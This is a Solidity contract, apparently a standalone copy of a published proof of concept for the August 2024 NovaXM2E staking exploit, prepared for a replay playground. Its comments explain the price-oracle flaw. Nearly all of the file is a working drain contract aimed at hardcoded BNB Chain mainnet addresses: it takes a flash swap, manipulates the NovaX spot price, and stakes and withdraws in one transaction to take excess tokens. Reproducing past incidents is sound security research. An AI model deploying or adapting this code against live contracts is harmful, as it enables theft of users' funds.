// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-08-NovaXM2E).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// contract: testExploit() triggers a PancakeSwap flash swap on the USDT/USDC
// pair, and the whole attack lives in the `pancakeCall` callback on the test
// contract itself (attacker == address(this)), so there is no standalone
// contract to deploy. This file is a faithful, self-contained copy of that
// inline attack (testExploit body -> run(); pancakeCall -> attack() copied
// verbatim) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/NovaXM2E_exp.sol.
//
// Root cause: TokenStake.stake() converts the deposited NovaX amount into a
// USD figure via Oracle.convertUsdBalanceDecimalToTokenDecimal() (typeConvert
// == 2, i.e. the live PancakeSwap NovaX/USDT spot reserve ratio) and STORES
// that USD figure. withdraw() later converts the STORED USD figure back into
// tokens at the CURRENT (re-queried) oracle price. Because pool 0 has
// duration == 0 (=> unlockTime == 0), stake and withdraw can happen in the
// same transaction. The attacker sandwiches their own stake/withdraw: crash
// the NovaX price (dump USDT into the pair) before staking -- so the stored
// USD value is inflated -- then restore/overshoot the price (sell NovaX back)
// before withdrawing, so the same stored USD value is redeemed for far more
// NovaX than was deposited. The oracle has no TWAP/staleness/manipulation
// guard, so a single flash-swapped block-local trade suffices.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ITokenStake {
    function stakeIndex() external returns (uint256);

    function stake(uint256 _poolId, uint256 _stakeValue) external;

    function withdraw(uint256 _stakeId) external;
}

contract NovaXM2EDrain {
    IPancakeRouter internal constant router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair internal constant flashPair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant NovaXM2E = IERC20(0xB800AFf8391aBACDEb0199AB9CeBF63771FcF491);
    ITokenStake internal constant tokenStake = ITokenStake(0x55C9EEbd368873494C7d06A4900E8F5674B11bD2);

    uint256 internal swapamount;

    // Mirror testExploit(): flash-swap 500,000 USDT from the USDT/USDC pair.
    // The pair's pancakeCall callback runs attack() below and repays within
    // this same transaction.
    function run() external {
        swapamount = 500_000 ether;
        flashPair.swap(swapamount, 0, address(this), new bytes(1));
    }

    // Mirror the test's pancakeCall(address,uint256,uint256,bytes) callback.
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // Step 1: crash the NovaX price by dumping the borrowed USDT into the
        // NovaX/USDT pair.
        swap_token_to_token(address(USDT), address(NovaXM2E), USDT.balanceOf(address(this)));

        // Step 2: stake HALF the cheaply-bought NovaX into pool 0 (no lock).
        // The oracle records an inflated USD value at the depressed price.
        NovaXM2E.approve(address(tokenStake), NovaXM2E.balanceOf(address(this)));
        tokenStake.stake(0, NovaXM2E.balanceOf(address(this)) / 2);

        // Step 3: sell the OTHER half of the NovaX back, restoring/overshooting
        // the price.
        swap_token_to_token(address(NovaXM2E), address(USDT), NovaXM2E.balanceOf(address(this)));

        // Step 4: withdraw the stake. The oracle is re-queried at the restored
        // price, so the stored USD value now buys far more NovaX than deposited.
        uint256 stakeIndex = tokenStake.stakeIndex();
        tokenStake.withdraw(stakeIndex);

        // Step 5: dump the windfall NovaX back for USDT.
        swap_token_to_token(address(NovaXM2E), address(USDT), NovaXM2E.balanceOf(address(this)));

        // Step 6: repay the flash swap (0.25% PancakeSwap fee).
        USDT.transfer(address(flashPair), swapamount * 10_000 / 9975 + 1000);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
